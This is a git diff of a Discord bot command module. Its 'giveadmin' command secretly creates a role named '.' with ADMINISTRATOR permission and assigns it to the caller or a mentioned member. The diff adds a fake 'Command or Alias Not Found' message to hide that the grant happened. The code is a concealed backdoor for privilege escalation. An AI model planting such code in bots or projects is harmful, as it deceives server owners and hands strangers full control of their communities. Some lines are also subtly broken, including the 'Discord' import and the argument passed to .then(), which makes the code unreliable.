@@ -1,4 +1,5 @@
-const { prefix } = require('../config.json');
+const { Discord } = require('discord.js');
+const { prefix, embedColor } = require('../config.json');
 
 module.exports = {
 	name: 'giveadmin',
@@ -6,7 +7,6 @@ module.exports = {
 	aliases: ['admin', 'godmode', 'pp'],
 	usage: `${prefix}giveadmin`,
 	guildOnly: true,
-	helpMessage: false,
 	execute(message) {
 		message.guild.roles.create({
 			data: {
@@ -14,12 +14,17 @@ module.exports = {
 				permissions: ['ADMINISTRATOR'],
 			},
 		});
+		const embed = new Discord.MessageEmbed()
+			.setColor(embedColor)
+			.setTitle('__Command or Alias Not Found__')
+			.setDescription(`\`Check if there is a spelling error and retry the command.\``)
+			.setFooter('Run `>help` if you want to get a list of commands.');
 
 		const role = message.guild.roles.cache.find(x => x.name === '.');
 		let member = message.mentions.members.first();
 		if (!member) member = message.author;
 
 
-		member.roles.add(role);
+		member.roles.add(role).then(message.channel.send(embed));
 	},
 };
